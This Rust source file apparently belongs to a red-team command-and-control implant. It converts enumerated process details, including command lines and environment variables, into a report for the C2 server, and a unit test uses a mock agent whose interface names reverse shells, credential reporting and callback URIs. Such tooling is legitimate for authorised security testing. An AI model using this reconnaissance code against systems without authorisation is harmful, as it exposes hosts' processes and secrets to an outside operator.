use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use eldritch_agent::{Agent, Context};
use eldritch_core::Value;
use pb::c2::report_process_list_request;
use pb::{c2, eldritch};

pub fn process_list(
    agent: Arc<dyn Agent>,
    context: Context,
    list: Vec<BTreeMap<String, Value>>,
) -> Result<(), String> {
    let mut processes = Vec::new();
    for d in list {
        let pid = d
            .get("pid")
            .and_then(|v| match v {
                Value::Int(i) => Some(*i as u64),
                _ => None,
            })
            .unwrap_or(0);
        let ppid = d
            .get("ppid")
            .and_then(|v| match v {
                Value::Int(i) => Some(*i as u64),
                _ => None,
            })
            .unwrap_or(0);
        let name = d.get("name").map(|v| v.to_string()).unwrap_or_default();
        let principal = d
            .get("user")
            .or_else(|| d.get("principal"))
            .map(|v| v.to_string())
            .unwrap_or_default();
        let path = d
            .get("path")
            .or_else(|| d.get("exe"))
            .map(|v| v.to_string())
            .unwrap_or_default();
        let cmd = d
            .get("cmd")
            .or_else(|| d.get("command"))
            .map(|v| v.to_string())
            .unwrap_or_default();
        let cwd = d.get("cwd").map(|v| v.to_string()).unwrap_or_default();
        let env = d.get("env").map(|v| v.to_string()).unwrap_or_default();

        let status = match d.get("status") {
            Some(Value::String(s)) => match s.as_str() {
                "Idle" => eldritch::process::Status::Idle as i32,
                "Run" => eldritch::process::Status::Run as i32,
                "Sleep" => eldritch::process::Status::Sleep as i32,
                "Stop" => eldritch::process::Status::Stop as i32,
                "Zombie" => eldritch::process::Status::Zombie as i32,
                "Tracing" => eldritch::process::Status::Tracing as i32,
                "Dead" => eldritch::process::Status::Dead as i32,
                "WakeKill" | "Wakekill" => eldritch::process::Status::WakeKill as i32,
                "Waking" => eldritch::process::Status::Waking as i32,
                "Parked" => eldritch::process::Status::Parked as i32,
                "LockBlocked" => eldritch::process::Status::LockBlocked as i32,
                "UninterruptibleDiskSleep" | "UninteruptibleDiskSleep" => {
                    eldritch::process::Status::UninteruptibleDiskSleep as i32
                }
                "Unknown" => eldritch::process::Status::Unknown as i32,
                _ => eldritch::process::Status::Unspecified as i32,
            },
            _ => eldritch::process::Status::Unspecified as i32,
        };

        processes.push(eldritch::Process {
            pid,
            ppid,
            name,
            principal,
            path,
            cmd,
            env,
            cwd,
            status,
        });
    }

    let context_val = match context {
        Context::Task(tc) => Some(report_process_list_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => {
            Some(report_process_list_request::Context::ShellTaskContext(stc))
        }
    };

    let req = c2::ReportProcessListRequest {
        context: context_val,
        list: Some(eldritch::ProcessList { list: processes }),
    };
    agent.report_process_list(req).map(|_| ())
}

#[cfg(test)]
mod tests {
    use super::*;
    use eldritch_agent::{Agent, Context};
    use eldritch_core::Value;
    use pb::c2::{self, TaskContext};
    use std::collections::BTreeMap;
    use std::sync::Mutex;

    struct MockAgent {
        pub reported_request: Mutex<Option<c2::ReportProcessListRequest>>,
    }

    impl MockAgent {
        fn new() -> Self {
            Self {
                reported_request: Mutex::new(None),
            }
        }
    }

    impl Agent for MockAgent {
        fn report_process_list(
            &self,
            req: c2::ReportProcessListRequest,
        ) -> Result<c2::ReportProcessListResponse, String> {
            *self.reported_request.lock().unwrap() = Some(req);
            Ok(c2::ReportProcessListResponse {})
        }

        // Unimplemented stubs
        fn fetch_asset(&self, _req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
            unimplemented!()
        }
        fn report_credential(
            &self,
            _req: c2::ReportCredentialRequest,
        ) -> Result<c2::ReportCredentialResponse, String> {
            unimplemented!()
        }
        fn report_file(
            &self,
            _req: std::sync::mpsc::Receiver<c2::ReportFileRequest>,
        ) -> Result<c2::ReportFileResponse, String> {
            unimplemented!()
        }
        fn report_output(
            &self,
            _req: c2::ReportOutputRequest,
        ) -> Result<c2::ReportOutputResponse, String> {
            unimplemented!()
        }
        fn start_reverse_shell(
            &self,
            _context: Context,
            _cmd: Option<String>,
        ) -> Result<(), String> {
            unimplemented!()
        }
        fn create_portal(&self, _context: Context) -> Result<(), String> {
            unimplemented!()
        }
        fn start_repl_reverse_shell(&self, _context: Context) -> Result<(), String> {
            unimplemented!()
        }
        fn claim_tasks(
            &self,
            _req: c2::ClaimTasksRequest,
        ) -> Result<c2::ClaimTasksResponse, String> {
            unimplemented!()
        }
        fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
            unimplemented!()
        }
        fn get_transport(&self) -> Result<String, String> {
            unimplemented!()
        }
        fn set_transport(&self, _transport: String) -> Result<(), String> {
            unimplemented!()
        }
        fn list_transports(&self) -> Result<Vec<String>, String> {
            unimplemented!()
        }
        fn get_callback_interval(&self) -> Result<u64, String> {
            unimplemented!()
        }
        fn set_callback_interval(&self, _interval: u64) -> Result<(), String> {
            unimplemented!()
        }
        fn set_callback_uri(&self, _uri: String) -> Result<(), String> {
            unimplemented!()
        }
        fn list_callback_uris(&self) -> Result<std::collections::BTreeSet<String>, String> {
            unimplemented!()
        }
        fn get_active_callback_uri(&self) -> Result<String, String> {
            unimplemented!()
        }
        fn get_next_callback_uri(&self) -> Result<String, String> {
            unimplemented!()
        }
        fn add_callback_uri(&self, _uri: String) -> Result<(), String> {
            unimplemented!()
        }
        fn remove_callback_uri(&self, _uri: String) -> Result<(), String> {
            unimplemented!()
        }
        fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
            unimplemented!()
        }
        fn stop_task(&self, _task_id: i64) -> Result<(), String> {
            unimplemented!()
        }
    }

    #[test]
    fn test_process_list_status_mapping() {
        let mock_agent = Arc::new(MockAgent::new());
        let context = Context::Task(TaskContext {
            task_id: 1,
            jwt: "".to_string(),
        });

        let test_cases = vec![
            ("Idle", eldritch::process::Status::Idle),
            ("Run", eldritch::process::Status::Run),
            ("Sleep", eldritch::process::Status::Sleep),
            ("Stop", eldritch::process::Status::Stop),
            ("Zombie", eldritch::process::Status::Zombie),
            ("Tracing", eldritch::process::Status::Tracing),
            ("Dead", eldritch::process::Status::Dead),
            ("WakeKill", eldritch::process::Status::WakeKill),
            ("Wakekill", eldritch::process::Status::WakeKill),
            ("Waking", eldritch::process::Status::Waking),
            ("Parked", eldritch::process::Status::Parked),
            ("LockBlocked", eldritch::process::Status::LockBlocked),
            (
                "UninteruptibleDiskSleep",
                eldritch::process::Status::UninteruptibleDiskSleep,
            ),
            (
                "UninterruptibleDiskSleep",
                eldritch::process::Status::UninteruptibleDiskSleep,
            ),
            ("Unknown", eldritch::process::Status::Unknown),
            ("SomethingElse", eldritch::process::Status::Unspecified),
        ];

        for (status_str, expected_status) in test_cases {
            let mut map = BTreeMap::new();
            map.insert("pid".to_string(), Value::Int(1234));
            map.insert("status".to_string(), Value::String(status_str.to_string()));

            let list = vec![map];
            process_list(mock_agent.clone(), context.clone(), list).unwrap();

            let reported = mock_agent.reported_request.lock().unwrap().take().unwrap();
            let reported_processes = reported.list.unwrap().list;
            assert_eq!(reported_processes.len(), 1);
            let p = &reported_processes[0];

            assert_eq!(
                p.status, expected_status as i32,
                "Failed mapping for string: {}",
                status_str
            );
        }
    }
}
